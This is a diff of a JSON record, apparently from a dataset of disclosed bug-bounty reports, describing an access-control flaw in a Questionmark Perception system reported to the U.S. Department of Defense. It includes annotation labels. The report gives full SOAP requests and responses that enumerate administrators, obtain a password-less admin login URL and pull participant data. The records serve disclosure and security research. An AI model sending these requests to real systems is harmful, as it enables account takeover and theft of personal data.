@@ -1,55 +1,55 @@
 {
-    "reported_to": "U.S. Dept Of Defense",
-    "reported_by": "qdoan95",
-    "title": "Unauthorized access to admin panel of the Questionmark Perception system at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
-    "content": "\nSummary:\nDue to the lack of access control, an anonymous attacker can compromise the administrator account on the Questionmark Perception system.\nDescription:\nBy using the service description which publicly accessible on the internet, and by bypassing the access control, an anonymous attacker can (ab)use the method provided by the system and get the administrator access on the Questionmark Perception system.\nStep-by-step Reproduction Instructions\nVisit https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 to get all the Questionmark Web Integration Services' description.\n\u2588\u2588\u2588\u2588\nThe method GetAdministratorList returns a list giving the full details of all the administrators in the database, as described in https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588?\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nIssuing the request shown above, but remove all the code between the <soapenv:Header> and the </soapenv:Header> tag like the request below:\nCode 478 Bytes\n1POST /\u2588\u2588\u2588 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\n3Content-Type: text/xml; charset=utf-8\n4Content-Length: 328\n5SOAPAction: \"http://questionmark.com/QMWISe/GetAdministratorList\"\n6\n7<?xml version=\"1.0\" encoding=\"utf-8\"?>\n8<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n9  <soap:Body>\n10    <GetAdministratorList xmlns=\"http://questionmark.com/QMWISe/\" />\n11  </soap:Body>\n12</soap:Envelope>\nThe response shows us a list giving the full details of all the administrators in the database, included Administrator_ID, Administrator_Name, Email,...\n\u2588\u2588\u2588\u2588\u2588\nThe method GetAccessAdministrator processes an Administrator Name and returns a URL that enables the administrator to log in to Enterprise Manager (without using a password) if the administrator exists, so using the information we got above, we can (ab)use this method to get access to an administrator account.\nCode 576 Bytes\n1POST /\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Content-Type: text/xml; charset=utf-8\n4Content-Length: 416\n5SOAPAction: \"http://questionmark.com/QMWISe/GetAccessAdministrator\"\n6\n7<?xml version=\"1.0\" encoding=\"utf-8\"?>\n8<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n9  <soap:Body>\n10    <GetAccessAdministrator xmlns=\"http://questionmark.com/QMWISe/\">\n11      <Administrator_Name>au_eliut</Administrator_Name>\n12    </GetAccessAdministrator>\n13  </soap:Body>\n14</soap:Envelope>\nThe response gives us a link to login without using a password.\nCode 867 Bytes\n1HTTP/1.1 200 OK\n2Cache-Control: private, max-age=0\n3Content-Type: text/xml; charset=utf-8\n4Server: 0\n5X-AspNet-Version: 2.0.50727\n6Strict-Transport-Security: max-age=63072000;includeSubDomains;preload\n7Date: Wed, 04 Nov 2020 18:18:46 GMT\n8Content-Length: 565\n9Set-Cookie: BIGipServer\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 path=/; Httponly; Secure\n10\n11<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><soap:Body><GetAccessAdministratorResponse xmlns=\"http://questionmark.com/QMWISe/\"><URL>https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/em5/exlogin.asp?CustomerID=AuthoringRepository&amp;USER=au_eliut&amp;EXPIRY=04:11:2020:13:18&amp;CHECKSUM=db69772f40b1a71179fd96e1bceebed003f3049e03a78e7d009c4627d387da2c</URL></GetAccessAdministratorResponse></soap:Body></soap:Envelope>\n12\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nUsing the link above: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 to login as admin.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\nRemove the service description at https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nRe-configure the system, to deny all the request without the SOAP \"Trust\" header.\nImpact\nIncorrect access restriction to the authorized interface of the site leads to information leakage. As Questionmark describes, an admin can view all fields of the questions, the results, and personal information of the participants.\nFor example, issuing the request below to get all the participants' information such as username, password,...\nCode 480 Bytes\n1POST /\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Content-Type: text/xml; charset=utf-8\n4Content-Length: 326\n5SOAPAction: \"http://questionmark.com/QMWISe/GetParticipantList\"\n6\n7<?xml version=\"1.0\" encoding=\"utf-8\"?>\n8<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n9  <soap:Body>\n10    <GetParticipantList xmlns=\"http://questionmark.com/QMWISe/\" />\n11  </soap:Body>\n12</soap:Envelope>\n\u2588\u2588\u2588\u2588\u2588\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "qdoan95",
+  "title": "Unauthorized access to admin panel of the Questionmark Perception system at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+  "content": "\nSummary:\nDue to the lack of access control, an anonymous attacker can compromise the administrator account on the Questionmark Perception system.\nDescription:\nBy using the service description which publicly accessible on the internet, and by bypassing the access control, an anonymous attacker can (ab)use the method provided by the system and get the administrator access on the Questionmark Perception system.\nStep-by-step Reproduction Instructions\nVisit https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 to get all the Questionmark Web Integration Services' description.\n\u2588\u2588\u2588\u2588\nThe method GetAdministratorList returns a list giving the full details of all the administrators in the database, as described in https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588?\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nIssuing the request shown above, but remove all the code between the <soapenv:Header> and the </soapenv:Header> tag like the request below:\nCode 478 Bytes\n1POST /\u2588\u2588\u2588 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\n3Content-Type: text/xml; charset=utf-8\n4Content-Length: 328\n5SOAPAction: \"http://questionmark.com/QMWISe/GetAdministratorList\"\n6\n7<?xml version=\"1.0\" encoding=\"utf-8\"?>\n8<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n9  <soap:Body>\n10    <GetAdministratorList xmlns=\"http://questionmark.com/QMWISe/\" />\n11  </soap:Body>\n12</soap:Envelope>\nThe response shows us a list giving the full details of all the administrators in the database, included Administrator_ID, Administrator_Name, Email,...\n\u2588\u2588\u2588\u2588\u2588\nThe method GetAccessAdministrator processes an Administrator Name and returns a URL that enables the administrator to log in to Enterprise Manager (without using a password) if the administrator exists, so using the information we got above, we can (ab)use this method to get access to an administrator account.\nCode 576 Bytes\n1POST /\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Content-Type: text/xml; charset=utf-8\n4Content-Length: 416\n5SOAPAction: \"http://questionmark.com/QMWISe/GetAccessAdministrator\"\n6\n7<?xml version=\"1.0\" encoding=\"utf-8\"?>\n8<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n9  <soap:Body>\n10    <GetAccessAdministrator xmlns=\"http://questionmark.com/QMWISe/\">\n11      <Administrator_Name>au_eliut</Administrator_Name>\n12    </GetAccessAdministrator>\n13  </soap:Body>\n14</soap:Envelope>\nThe response gives us a link to login without using a password.\nCode 867 Bytes\n1HTTP/1.1 200 OK\n2Cache-Control: private, max-age=0\n3Content-Type: text/xml; charset=utf-8\n4Server: 0\n5X-AspNet-Version: 2.0.50727\n6Strict-Transport-Security: max-age=63072000;includeSubDomains;preload\n7Date: Wed, 04 Nov 2020 18:18:46 GMT\n8Content-Length: 565\n9Set-Cookie: BIGipServer\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 path=/; Httponly; Secure\n10\n11<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><soap:Body><GetAccessAdministratorResponse xmlns=\"http://questionmark.com/QMWISe/\"><URL>https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/em5/exlogin.asp?CustomerID=AuthoringRepository&amp;USER=au_eliut&amp;EXPIRY=04:11:2020:13:18&amp;CHECKSUM=db69772f40b1a71179fd96e1bceebed003f3049e03a78e7d009c4627d387da2c</URL></GetAccessAdministratorResponse></soap:Body></soap:Envelope>\n12\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nUsing the link above: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 to login as admin.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\nRemove the service description at https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nRe-configure the system, to deny all the request without the SOAP \"Trust\" header.\nImpact\nIncorrect access restriction to the authorized interface of the site leads to information leakage. As Questionmark describes, an admin can view all fields of the questions, the results, and personal information of the participants.\nFor example, issuing the request below to get all the participants' information such as username, password,...\nCode 480 Bytes\n1POST /\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Content-Type: text/xml; charset=utf-8\n4Content-Length: 326\n5SOAPAction: \"http://questionmark.com/QMWISe/GetParticipantList\"\n6\n7<?xml version=\"1.0\" encoding=\"utf-8\"?>\n8<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n9  <soap:Body>\n10    <GetParticipantList xmlns=\"http://questionmark.com/QMWISe/\" />\n11  </soap:Body>\n12</soap:Envelope>\n\u2588\u2588\u2588\u2588\u2588\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Improper Access Control - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1625100060,
+  "report_url": "https://hackerone.com/reports/1026146",
+  "vuln_category": "API",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "steps": [
+    [
+      1,
+      "Visit the Questionmark Web Integration Services' description URL to get service details."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Improper Access Control - Generic"
+    [
+      2,
+      "Send a SOAP request to GetAdministratorList without the SOAP header to retrieve admin details."
     ],
-    "screenshots": {},
-    "disclosed_date": 1625100060,
-    "report_url": "https://hackerone.com/reports/1026146",
-    "vuln_category": "API",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "MEDIUM",
-    "steps": [
-        [
-            1,
-            "Visit the Questionmark Web Integration Services' description URL to get service details."
-        ],
-        [
-            2,
-            "Send a SOAP request to GetAdministratorList without the SOAP header to retrieve admin details."
-        ],
-        [
-            3,
-            "Use the retrieved administrator name to send a SOAP request to GetAccessAdministrator to obtain a login URL."
-        ],
-        [
-            4,
-            "Use the provided URL to log in as an administrator without a password."
-        ]
+    [
+      3,
+      "Use the retrieved administrator name to send a SOAP request to GetAccessAdministrator to obtain a login URL."
     ],
-    "vuln_description": "The vulnerability allows an anonymous attacker to bypass access controls in the Questionmark Perception system, retrieve administrator details via a SOAP request, and gain unauthorized admin access by obtaining a password-less login URL.",
-    "reason": "The attack involves understanding SOAP API interactions and manipulating requests to bypass authentication, but the steps are straightforward once the API endpoints are known.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": false,
-    "authnz_byppass_detectable": true,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": false,
-        "authnz_byppass_detectable": true
-    }
+    [
+      4,
+      "Use the provided URL to log in as an administrator without a password."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an anonymous attacker to bypass access controls in the Questionmark Perception system, retrieve administrator details via a SOAP request, and gain unauthorized admin access by obtaining a password-less login URL.",
+  "reason": "The attack involves understanding SOAP API interactions and manipulating requests to bypass authentication, but the steps are straightforward once the API endpoints are known.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": true,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves bypassing authentication and authorization controls by manipulating SOAP requests to access admin functionality without proper credentials. The methodology described involves testing authorization boundaries by swapping user sessions and resource IDs, which aligns with the steps needed to detect this vulnerability (e.g., executing actions with unauthenticated sessions or different user sessions to test for access control failures).",
+    "is_detectable": true
+  }
 }
